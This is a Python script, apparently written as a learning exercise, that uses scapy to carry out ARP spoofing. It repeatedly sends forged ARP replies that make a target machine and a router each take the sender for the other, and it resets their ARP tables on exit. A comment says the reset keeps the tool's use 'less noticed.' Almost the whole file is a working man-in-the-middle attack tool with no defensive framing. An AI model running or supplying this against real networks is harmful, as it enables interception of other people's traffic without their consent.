import scapy.all as scapy
import time
import argparse


def get_argument():
    # allow me to parse out arguments/options/flags from the command line.
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target", help="specify the target IP address you want to hit: Example - 10.0.2.5. don't forget quotes around the numbers")
    parser.add_argument("-s", "--spoof", dest="spoof", help="specify the IP address you want to spoof: Example - 10.0.2.1. don't forget quotes around the numbers")
    options = parser.parse_args()
    # conditionals in case user forgets to enter the arguments.
    if not options:
        parser.error("[-] Please specify a target and spoof IP, use --help for more info. ")
    return options


def get_mac(ip):
    # uses scapy to send packets out to designated ip(s) to get their MAC address
    arp_request = scapy.ARP(pdst=ip)
    #  how we put the destination MAC address into the packets we send out from our MAC address.
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    # creating a new packet that is the combo of the above two packets. Asking who has an given IP (or range of IPs)
    # and to send the response to our machine.
    arp_request_broadcast = broadcast/arp_request
    # arp allows us to send packets with a custom ether part, which we did above. the responses will either be answered
    # or unanswered packets. the timeout only lets it wait up to 1 second for a response, otherwise we'll never exit this.
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    # return this target mac address.
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    # creating a packet via scapy. op is setting the ARP as a response, not a request. (machines accept responses even
    # if they didn't ask for it)
    # pdst is the target machine IP.    hwdst = target MAC address   psrc = router IP.
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    # send the packet.
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    # to restore the targets connection with the router after so the use of the tool is less noticed.
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    # make a packet
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False) # send the packet, send it 4 times just to make sure.


options = get_argument()
the_target_ip = options.target
router_ip = options.spoof

# hard coding section for testing purposes:
# the_target_ip = "10.0.2.5"
# router_ip = "10.0.2.1"
try:
    sent_packets_count = 0
    while True:
        # trick the target into thinking I'm the router
        spoof(the_target_ip, router_ip)
        # trick the router into thinking I'm the target
        spoof(router_ip, the_target_ip)
        # make the terminal output look better
        sent_packets_count = sent_packets_count + 2
        print("\r[+] Packets sent: " + str(sent_packets_count), end="")
        # time delay to avoid sending too many packets at once.
        time.sleep(2)
except KeyboardInterrupt:
    print("[+] Detected CTRL + C ..... Resetting ARP tables..... Please wait.")
    restore(the_target_ip, router_ip)
    restore(router_ip, the_target_ip)